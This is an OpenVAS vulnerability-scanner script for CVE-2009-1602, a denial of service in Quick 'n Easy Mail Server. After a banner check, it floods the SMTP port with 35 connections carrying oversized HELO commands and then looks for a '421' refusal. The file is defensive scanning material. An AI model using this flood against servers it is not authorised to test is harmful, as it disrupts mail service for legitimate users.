###############################################################################
# OpenVAS Vulnerability Test
# $Id: quick_easy_mail_server_34814.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Quick 'n Easy Mail Server SMTP Request Remote Denial Of Service Vulnerability
#
# Authors
# Michael Meyer
#
# Increased crap length to 10000 (By Michael Meyer, 2009-05-15)
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Quick 'n Easy Mail Server is prone to a denial-of-service
  vulnerability because it fails to adequately handle multiple socket
  requests.

  Attackers can exploit this issue to cause the affected application
  to reject SMTP requests, denying service to legitimate users.

  The demonstration release of Quick 'n Easy Mail Server 3.3 is
  vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100185");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-05-06 14:55:27 +0200 (Wed, 06 May 2009)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2009-1602");
 script_bugtraq_id(34814);

 script_name("Quick 'n Easy Mail Server SMTP Request Remote Denial Of Service Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("SMTP problems");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34814");
 exit(0);
}


include("smtp_func.inc");

if(safe_checks()){
  exit(0);
}

port = get_kb_item("Services/smtp");
if(!port){
  port = 25;
}

if(get_port_state(port))
{
  soctcp25 = open_sock_tcp(port);
  if (soctcp25)
  {
    bannertxt = smtp_recv_banner(socket:soctcp25);
    if(!bannertxt)
    {
      close(soctcp25);
      exit(0);
    }

    if(!("Quick 'n Easy Mail Server" >< bannertxt))
    {
      close(soctcp25);
      exit(0);
    }

    close(soctcp25);
    data = string("HELO ");
    data += crap(length: 100000, data:"OpenVAS@example.org");
    data += string("\r\n");
    for(i=0; i<35; i++)
    {
      soctcp = open_sock_tcp(port);
      send(socket:soctcp, data:data);
      ehlotxt = smtp_recv_line(socket:soctcp);
      if(egrep(pattern:"421 Service not available", string: ehlotxt))
      {
        security_message(port:port);
        close(soctcp);
        exit(0);
      }
    }
  }
}
